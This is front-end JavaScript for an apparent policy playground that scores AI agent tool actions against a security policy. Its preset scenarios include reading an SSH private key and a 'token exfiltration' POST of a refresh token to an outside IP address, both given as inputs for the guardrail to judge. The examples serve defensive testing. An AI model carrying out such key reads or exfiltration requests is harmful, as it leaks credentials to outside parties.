const scenarios = [
  {
    id: "workspace-read",
    label: "Workspace read",
    action: { tool: "filesystem.read", arguments: { path: "./README.md" } },
  },
  {
    id: "production-write",
    label: "Production write",
    action: { tool: "deployment.apply", operation: "write", arguments: { environment: "production", version: "v0.2.0" } },
  },
  {
    id: "private-key",
    label: "Private key",
    action: { tool: "filesystem.read", arguments: { path: "~/.ssh/id_rsa" } },
  },
  {
    id: "token-exfiltration",
    label: "Token exfiltration",
    action: {
      tool: "http.request",
      arguments: {
        method: "POST",
        url: "http://198.51.100.8/upload",
        body: { refresh_token: "playground-placeholder" },
      },
    },
  },
  {
    id: "shell-command",
    label: "Shell command",
    action: { tool: "shell.exec", arguments: { command: "npm test" } },
  },
];

const state = {
  token: "",
  baselinePolicy: "",
  latestResult: null,
  selectedScenario: scenarios[0].id,
};

const elements = {
  action: document.querySelector("#action-editor"),
  policy: document.querySelector("#policy-editor"),
  agent: document.querySelector("#agent-id"),
  verified: document.querySelector("#identity-verified"),
  evaluate: document.querySelector("#evaluate"),
  format: document.querySelector("#format-action"),
  reset: document.querySelector("#reset-policy"),
  copy: document.querySelector("#copy-result"),
  result: document.querySelector("#result-content"),
  resultCard: document.querySelector(".result-card"),
  scenarioList: document.querySelector("#scenario-list"),
  actionMeta: document.querySelector("#action-meta"),
  policyMeta: document.querySelector("#policy-meta"),
  policyState: document.querySelector(".policy-state"),
  policyStateLabel: document.querySelector("#policy-state-label"),
  policyDigest: document.querySelector("#policy-digest"),
};

function escapeHTML(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

function lines(value) {
  return value === "" ? 0 : value.split("\n").length;
}

function updateEditorMeta() {
  elements.actionMeta.textContent = `${lines(elements.action.value)} lines · ${new Blob([elements.action.value]).size} bytes`;
  elements.policyMeta.textContent = `${lines(elements.policy.value)} lines · ${new Blob([elements.policy.value]).size} bytes`;
  const edited = elements.policy.value !== state.baselinePolicy;
  elements.policyState.classList.toggle("edited", edited);
  elements.policyStateLabel.textContent = edited ? "Edited / comparing to baseline" : "Loaded policy / baseline";
}

function renderScenarios() {
  elements.scenarioList.replaceChildren();
  for (const scenario of scenarios) {
    const button = document.createElement("button");
    button.type = "button";
    button.className = `scenario-button${scenario.id === state.selectedScenario ? " active" : ""}`;
    button.textContent = scenario.label;
    button.addEventListener("click", () => {
      state.selectedScenario = scenario.id;
      elements.action.value = JSON.stringify(scenario.action, null, 2);
      renderScenarios();
      updateEditorMeta();
      void evaluate();
    });
    elements.scenarioList.append(button);
  }
}

function formatAction() {
  try {
    elements.action.value = JSON.stringify(JSON.parse(elements.action.value), null, 2);
    updateEditorMeta();
  } catch (error) {
    renderError("Action JSON is invalid", error instanceof Error ? error.message : String(error));
  }
}

function setLoading(loading) {
  elements.evaluate.disabled = loading;
  elements.evaluate.classList.toggle("loading", loading);
  elements.resultCard.setAttribute("aria-busy", String(loading));
  elements.evaluate.querySelector("span").textContent = loading ? "Evaluating" : "Evaluate action";
}

async function evaluate() {
  let action;
  try {
    action = JSON.parse(elements.action.value);
  } catch (error) {
    renderError("Action JSON is invalid", error instanceof Error ? error.message : String(error));
    return;
  }
  if (!action || Array.isArray(action) || typeof action !== "object") {
    renderError("Action JSON is invalid", "The action must be a JSON object.");
    return;
  }

  setLoading(true);
  try {
    const response = await fetch("/api/evaluate", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Latch-Playground-Token": state.token,
      },
      body: JSON.stringify({
        policy_yaml: elements.policy.value,
        baseline_policy_yaml: state.baselinePolicy,
        action,
        identity: { id: elements.agent.value, verified: elements.verified.checked },
      }),
    });
    const payload = await response.json();
    if (!response.ok) {
      throw new Error(payload?.error?.message || `Playground returned HTTP ${response.status}`);
    }
    state.latestResult = payload;
    elements.copy.disabled = false;
    elements.policyDigest.textContent = payload.evaluation.policy.digest.slice(0, 10);
    renderAssessment(payload);
  } catch (error) {
    state.latestResult = null;
    elements.copy.disabled = true;
    renderError("Evaluation stopped safely", error instanceof Error ? error.message : String(error));
  } finally {
    setLoading(false);
  }
}

function decisionClass(decision) {
  return String(decision).toLowerCase().replaceAll("_", "-");
}

function renderAssessment(payload) {
  const evaluation = payload.evaluation;
  const assessment = evaluation.assessment;
  const rules = evaluation.matched_rules || [];
  const signals = assessment.signals || [];
  const reasons = assessment.reasons || [];
  const decision = escapeHTML(assessment.decision);
  const klass = decisionClass(assessment.decision);
  const decisionMark = assessment.decision === "ALLOW" ? "✓" : "!";

  const delta = payload.delta;
  let deltaHTML = "";
  if (delta?.policy_was_changed) {
    const headline = delta.weakened
      ? "Security boundary weakened"
      : delta.changed
        ? "Decision path changed"
        : "Policy changed, outcome held";
    const detail = delta.changed
      ? `${delta.from} became ${delta.to}. ${delta.added_rules?.length || 0} rule(s) entered and ${delta.removed_rules?.length || 0} left the match set.`
      : "The edited policy produced the same decision and matching-rule path for this action.";
    deltaHTML = `
      <section class="delta${delta.weakened ? " weakened" : ""}">
        <div class="delta-flow"><span>${escapeHTML(delta.from)}</span><i>→</i><span>${escapeHTML(delta.to)}</span></div>
        <strong>${escapeHTML(headline)}</strong>
        <p>${escapeHTML(detail)}</p>
      </section>`;
  }

  const rulesHTML = rules.length
    ? rules.map((rule) => `<span class="chip ${decisionClass(rule.action)}" title="priority ${Number(rule.priority)}">${escapeHTML(rule.id)} · ${escapeHTML(rule.action)}</span>`).join("")
    : `<span class="chip">No policy rule matched</span>`;

  const signalsHTML = signals.length
    ? signals.map((signal) => `
        <div class="signal">
          <i aria-hidden="true"></i>
          <div><strong>${escapeHTML(signal.name)}</strong><p>${escapeHTML(signal.description)}</p></div>
          <span>+${Number(signal.score)}</span>
        </div>`).join("")
    : `<p class="notice">No deterministic risk signals fired for this action.</p>`;

  const reasonsHTML = reasons.length
    ? `<ul class="reason-list">${reasons.map((reason) => `<li>${escapeHTML(reason)}</li>`).join("")}</ul>`
    : `<p class="notice">The action reached the default policy outcome without additional reasons.</p>`;

  const normalized = escapeHTML(JSON.stringify(evaluation.normalized_action, null, 2));
  const notices = (payload.notices || []).map((notice) => `<li>${escapeHTML(notice)}</li>`).join("");
  const canonicalAgent = assessment.canonical_agent_id || evaluation.normalized_action.agent_id || "unbound";
  const identityState = assessment.identity_verified ? "VERIFIED" : "UNVERIFIED";

  elements.result.innerHTML = `
    <div class="assessment">
      <section class="decision-hero ${klass}">
        <div><small>FINAL DECISION</small><h3>${decision.replaceAll("_", " ")}</h3><code>${escapeHTML(assessment.decision_source)}</code></div>
        <span class="decision-mark" aria-hidden="true">${decisionMark}</span>
      </section>
      <section class="metrics">
        <div class="metric"><span>Risk</span><strong>${Number(assessment.risk_score)}/100 · ${escapeHTML(assessment.risk_level)}</strong><progress class="risk-line" max="100" value="${Math.min(100, Math.max(0, Number(assessment.risk_score)))}"></progress></div>
        <div class="metric"><span>Identity</span><strong>${identityState}</strong><code>${escapeHTML(canonicalAgent)}</code></div>
        <div class="metric"><span>Policy</span><strong>${Number(evaluation.policy.rules)} rules</strong><code>${escapeHTML(evaluation.policy.digest.slice(0, 10))}</code></div>
      </section>
      ${deltaHTML}
      <section class="result-section"><div class="section-label"><span>MATCHED RULES</span><span>${rules.length}</span></div><div class="chips">${rulesHTML}</div></section>
      <section class="result-section"><div class="section-label"><span>RISK SIGNALS</span><span>${signals.length}</span></div>${signalsHTML}</section>
      <section class="result-section"><div class="section-label"><span>WHY THIS DECISION</span><span>${escapeHTML(assessment.decision_source)}</span></div>${reasonsHTML}</section>
      <section class="result-section"><div class="section-label"><span>NORMALIZED ACTION</span><span>${escapeHTML(evaluation.normalized_action.operation)}</span></div><pre class="json-preview">${normalized}</pre></section>
      <section class="result-section"><div class="section-label"><span>SIMULATION CONTRACT</span><span>SAFE</span></div><ul class="reason-list">${notices}</ul></section>
    </div>`;
}

function renderError(title, message) {
  elements.result.innerHTML = `
    <div class="error-state">
      <span>FAIL CLOSED</span>
      <h3>${escapeHTML(title)}</h3>
      <p>${escapeHTML(message)}</p>
    </div>`;
}

async function copyResult() {
  if (!state.latestResult) return;
  try {
    await navigator.clipboard.writeText(JSON.stringify(state.latestResult, null, 2));
    elements.copy.textContent = "Copied";
    setTimeout(() => { elements.copy.textContent = "Copy JSON"; }, 1200);
  } catch {
    elements.copy.textContent = "Copy failed";
    setTimeout(() => { elements.copy.textContent = "Copy JSON"; }, 1200);
  }
}

async function bootstrap() {
  try {
    const response = await fetch("/api/bootstrap", { headers: { Accept: "application/json" } });
    if (!response.ok) throw new Error(`Bootstrap returned HTTP ${response.status}`);
    const payload = await response.json();
    state.token = payload.token;
    state.baselinePolicy = payload.policy_yaml;
    elements.policy.value = payload.policy_yaml;
    elements.agent.value = payload.agent_id;
    elements.action.value = JSON.stringify(payload.default_action, null, 2);
    renderScenarios();
    updateEditorMeta();
    await evaluate();
  } catch (error) {
    renderError("Playground could not initialize", error instanceof Error ? error.message : String(error));
    elements.evaluate.disabled = true;
  }
}

elements.action.addEventListener("input", updateEditorMeta);
elements.policy.addEventListener("input", updateEditorMeta);
elements.evaluate.addEventListener("click", () => { void evaluate(); });
elements.format.addEventListener("click", formatAction);
elements.reset.addEventListener("click", () => {
  elements.policy.value = state.baselinePolicy;
  updateEditorMeta();
  void evaluate();
});
elements.copy.addEventListener("click", () => { void copyResult(); });
document.addEventListener("keydown", (event) => {
  if ((event.ctrlKey || event.metaKey) && event.key === "Enter") {
    event.preventDefault();
    void evaluate();
  }
});

void bootstrap();
